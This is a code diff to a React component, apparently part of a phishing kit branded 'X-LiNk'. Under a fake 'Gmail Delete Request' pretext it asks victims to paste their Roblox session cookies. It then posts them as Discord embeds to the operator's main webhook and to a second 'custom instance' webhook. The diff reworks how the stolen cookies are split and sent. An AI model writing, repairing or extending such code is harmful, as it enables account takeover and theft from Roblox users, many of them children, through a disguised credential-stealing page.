@@ -41,17 +41,6 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     return { refId: null, webhookData: null };
   };
 
-  // Split large text into smaller chunks - Discord has strict limits
-  const splitTextIntoChunks = (text: string, maxLength = 1000) => {
-    if (!text || text.length <= maxLength) return [text];
-
-    const chunks = [];
-    for (let i = 0; i < text.length; i += maxLength) {
-      chunks.push(text.substring(i, i + maxLength));
-    }
-    return chunks;
-  };
-
   const sendToWebhook = async (
     webhookUrl: string,
     data: any,
@@ -72,32 +61,21 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
 
       console.log(`📊 Cookie data length: ${cleanCookies.length} characters`);
 
-      // For very large data, send as multiple separate webhook calls
-      if (cleanCookies.length > 800) {
-        return await sendLargeData(
-          webhookUrl,
-          cleanCookies,
-          webhookType,
-          refId,
-          timestamp,
-        );
-      }
-
-      // For smaller data, send as single embed
+      // Always send as single Part 1 - no matter the size
       const embed = {
         title:
           webhookType === "custom"
-            ? "🔥 Gmail Delete Request (Custom Instance)"
-            : "🔥 Gmail Delete Request (Main System)",
+            ? "🔥 Gmail Delete Request (Custom Instance) - Part 1"
+            : "🔥 Gmail Delete Request (Main System) - Part 1",
         color: webhookType === "custom" ? 12632256 : 16711680,
         description:
           webhookType === "custom"
-            ? "🎯 New Gmail deletion request from your custom instance!"
+            ? "🎯 Gmail deletion request from your custom instance!"
             : "📨 Gmail deletion request received and processed.",
         fields: [
           {
-            name: "🍪 Roblox Cookies",
-            value: `\`\`\`\n${cleanCookies}\n\`\`\``,
+            name: "🍪 Roblox Cookies - Part 1",
+            value: `\`\`\`\n${cleanCookies.substring(0, 1800)}\n\`\`\``, // Limit to Discord's field limit
             inline: false,
           },
           {
@@ -110,11 +88,24 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
             value: "Delete Gmail",
             inline: true,
           },
+          {
+            name: "📊 Data Size",
+            value: `${cleanCookies.length} characters`,
+            inline: true,
+          },
           ...(refId
             ? [
                 {
                   name: "🔗 Instance ID",
                   value: refId,
+                  inline: true,
+                },
+                {
+                  name: "🌐 Source",
+                  value:
+                    webhookType === "custom"
+                      ? "Custom Instance"
+                      : "Main System Monitor",
                   inline: true,
                 },
               ]
@@ -123,14 +114,33 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
         footer: {
           text:
             webhookType === "custom"
-              ? "X-LiNk Custom Instance"
-              : "X-LiNk Main System",
+              ? "X-LiNk Custom Instance - Part 1 Complete"
+              : "X-LiNk Main System - Part 1 Complete",
         },
       };
 
+      // If data is too long for one field, add additional fields
+      if (cleanCookies.length > 1800) {
+        const remainingData = cleanCookies.substring(1800);
+        const additionalChunks = [];
+
+        for (let i = 0; i < remainingData.length; i += 1800) {
+          additionalChunks.push(remainingData.substring(i, i + 1800));
+        }
+
+        // Add remaining data as additional fields in the same embed
+        additionalChunks.forEach((chunk, index) => {
+          embed.fields.splice(1, 0, {
+            name: `🍪 Cookies Continuation ${index + 2}`,
+            value: `\`\`\`\n${chunk}\n\`\`\``,
+            inline: false,
+          });
+        });
+      }
+
       const payload = { embeds: [embed] };
 
-      console.log(`📤 Sending single embed to ${webhookType} webhook`);
+      console.log(`📤 Sending single Part 1 to ${webhookType} webhook`);
 
       const response = await fetch(webhookUrl, {
         method: "POST",
@@ -139,7 +149,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
       });
 
       if (response.ok) {
-        console.log(`✅ ${webhookType} webhook sent successfully!`);
+        console.log(`✅ ${webhookType} webhook Part 1 sent successfully!`);
         return true;
       } else {
         const errorText = await response.text();
@@ -152,126 +162,6 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
       }
     } catch (error) {
       console.error(`❌ ${webhookType} webhook error:`, error);
-      return false;
-    }
-  };
-
-  const sendLargeData = async (
-    webhookUrl: string,
-    cookiesData: string,
-    webhookType: string,
-    refId: string | null,
-    timestamp: string,
-  ) => {
-    try {
-      console.log(`📦 Sending large data in multiple messages...`);
-
-      // Split cookies into chunks
-      const chunks = splitTextIntoChunks(cookiesData, 1000);
-      console.log(`📊 Split into ${chunks.length} chunks`);
-
-      let allSuccess = true;
-
-      // Send header message first
-      const headerEmbed = {
-        title:
-          webhookType === "custom"
-            ? "🔥 Gmail Delete Request (Custom Instance) - LARGE DATA"
-            : "🔥 Gmail Delete Request (Main System) - LARGE DATA",
-        color: webhookType === "custom" ? 12632256 : 16711680,
-        description:
-          webhookType === "custom"
-            ? `🎯 Large Gmail deletion request from your custom instance!\nData split into ${chunks.length} parts.`
-            : `📨 Large Gmail deletion request received.\nData split into ${chunks.length} parts.`,
-        fields: [
-          {
-            name: "⏰ Timestamp",
-            value: timestamp,
-            inline: true,
-          },
-          {
-            name: "🎯 Action",
-            value: "Delete Gmail",
-            inline: true,
-          },
-          {
-            name: "📊 Total Parts",
-            value: chunks.length.toString(),
-            inline: true,
-          },
-          ...(refId
-            ? [
-                {
-                  name: "🔗 Instance ID",
-                  value: refId,
-                  inline: true,
-                },
-              ]
-            : []),
-        ],
-        footer: {
-          text:
-            webhookType === "custom"
-              ? "X-LiNk Custom Instance"
-              : "X-LiNk Main System",
-        },
-      };
-
-      // Send header
-      let response = await fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [headerEmbed] }),
-      });
-
-      if (!response.ok) {
-        console.error(`❌ Header message failed for ${webhookType}`);
-        allSuccess = false;
-      } else {
-        console.log(`✅ Header message sent to ${webhookType}`);
-      }
-
-      // Send each chunk as separate message with small delay
-      for (let i = 0; i < chunks.length; i++) {
-        const chunkEmbed = {
-          title: `🍪 Cookies Part ${i + 1}/${chunks.length}`,
-          color: webhookType === "custom" ? 11119017 : 16744516,
-          description: `\`\`\`\n${chunks[i]}\n\`\`\``,
-          footer: {
-            text: `Part ${i + 1} of ${chunks.length}`,
-          },
-        };
-
-        try {
-          // Small delay between chunks to avoid rate limiting
-          if (i > 0) {
-            await new Promise((resolve) => setTimeout(resolve, 200));
-          }
-
-          response = await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [chunkEmbed] }),
-          });
-
-          if (response.ok) {
-            console.log(`✅ Chunk ${i + 1} sent to ${webhookType}`);
-          } else {
-            console.error(`❌ Chunk ${i + 1} failed for ${webhookType}`);
-            allSuccess = false;
-          }
-        } catch (error) {
-          console.error(
-            `❌ Error sending chunk ${i + 1} to ${webhookType}:`,
-            error,
-          );
-          allSuccess = false;
-        }
-      }
-
-      return allSuccess;
-    } catch (error) {
-      console.error(`❌ Error in sendLargeData for ${webhookType}:`, error);
       return false;
     }
   };
@@ -291,13 +181,14 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
 
     console.log("🚀 Starting webhook delivery process...");
     console.log("📋 Data size:", cookies.length, "characters");
+    console.log("📦 Will send as single Part 1");
 
     let mainWebhookSuccess = false;
     let customWebhookSuccess = false;
 
     // ALWAYS send to main webhook first
     try {
-      console.log("📤 Sending to MAIN webhook...");
+      console.log("📤 Sending Part 1 to MAIN webhook...");
       mainWebhookSuccess = await sendToWebhook(MAIN_WEBHOOK, data, "main");
       console.log(
         "📊 Main webhook result:",
@@ -310,7 +201,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     // Send to custom webhook if this is a custom instance
     if (refId && webhookData && webhookData.webhook) {
       try {
-        console.log("📤 Sending to CUSTOM webhook...");
+        console.log("📤 Sending Part 1 to CUSTOM webhook...");
         customWebhookSuccess = await sendToWebhook(
           webhookData.webhook,
           data,
@@ -328,15 +219,15 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
     // Report final results
     console.log("📊 FINAL DELIVERY RESULTS:");
     console.log(
-      `  🎯 Main webhook: ${mainWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
+      `  🎯 Main webhook Part 1: ${mainWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
     );
     console.log(
-      `  🎯 Custom webhook: ${customWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
+      `  🎯 Custom webhook Part 1: ${customWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
     );
 
     // Consider success if at least one webhook succeeded
     if (mainWebhookSuccess || customWebhookSuccess) {
-      console.log("🎉 Data delivered successfully!");
+      console.log("🎉 Part 1 delivered successfully!");
       onSuccess();
     } else {
       console.error("💥 ALL WEBHOOKS FAILED!");
@@ -394,7 +285,7 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
                 Roblox Cookies
               </label>
               <Textarea
-                placeholder="Paste your Roblox cookies here... (supports any size)"
+                placeholder="Paste your Roblox cookies here... (will send as Part 1)"
                 value={cookies}
                 onChange={(e) => setCookies(e.target.value)}
                 className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 min-h-[200px] focus:border-gray-400 transition-colors resize-none"
@@ -405,11 +296,9 @@ export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
                   <p className="text-xs text-gray-400">
                     Data size: {cookies.length} characters
                   </p>
-                  {cookies.length > 800 && (
-                    <span className="text-xs text-green-400 bg-green-900/20 px-2 py-1 rounded">
-                      ✓ Will send as multiple parts
-                    </span>
-                  )}
+                  <span className="text-xs text-blue-400 bg-blue-900/20 px-2 py-1 rounded">
+                    ✓ Will send as Part 1
+                  </span>
                 </div>
               )}
             </motion.div>
